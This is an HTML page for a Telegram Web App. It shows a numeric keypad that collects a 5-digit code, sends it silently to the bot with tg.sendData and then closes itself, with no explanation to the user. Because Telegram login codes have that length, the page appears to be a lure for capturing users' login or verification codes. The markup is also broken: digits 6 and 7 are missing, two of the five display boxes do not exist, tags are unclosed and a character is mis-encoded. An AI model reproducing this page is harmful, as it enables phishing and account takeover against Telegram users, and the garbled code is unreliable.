<!DOCTYPE html>
<html lang="en">
<head>

    <style>
        body { background: #121212; color: white; font-family: sans-serif; text-align: center; margin: 0; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; }

        .keypad { display: grid; grid-template-columns: repeat(3, 1fr); gap: 12px; width: 90%; max-width: 320px; }
        .key { background: #5a78f0; padding: 18px; border-radius: 10px; font-size: 20px; cursor: pointer; border: none; color: white; font-weight: bold; }
        .key:active { background: #3f56b5; }
        .btn-get { background: #ffffff33; color: #fff; padding: 10px; border-radius: 8px; width: 90%; margin-bottom: 15px; font-weight: bold; border: 1px solid #ffffff55; }
    </style>
</head>

    <div class="code-container">
        <div class="code-box" id="b1"></div>
        <div class="code-box" id="b2"></div>
        <div class="code-box" id="b3"></div>

    <div class="keypad">
        <button class="key" onclick="press('1')">1</button>
        <button class="key" onclick="press('2')">2</button>
        <button class="key" onclick="press('3')">3</button>
        <button class="key" onclick="press('4')">4</button>
        <button class="key" onclick="press('5')">5</button>

        <button class="key" onclick="press('8')">8</button>
        <button class="key" onclick="press('9')">9</button>
        <div></div>
        <button class="key" onclick="press('0')">0</button>
        <button class="key" onclick="del()">âŒ«</button>
    </div>

    <script>
        let code = "";
        const tg = window.Telegram.WebApp;
        tg.expand();

        function press(num) {
            if (code.length < 5) {
                code += num;
                updateDisplay();
                if (code.length === 5) {
                    setTimeout(() => {
                        tg.sendData(code);
                        tg.close();
                    }, 300);
                }
            }
        }
        function del() {
            code = code.slice(0, -1);
            updateDisplay();
        }
        function updateDisplay() {
            for (let i = 1; i <= 5; i++) {
                document.getElementById('b' + i).innerText = code[i - 1] || "";
            }
        }
    </script>
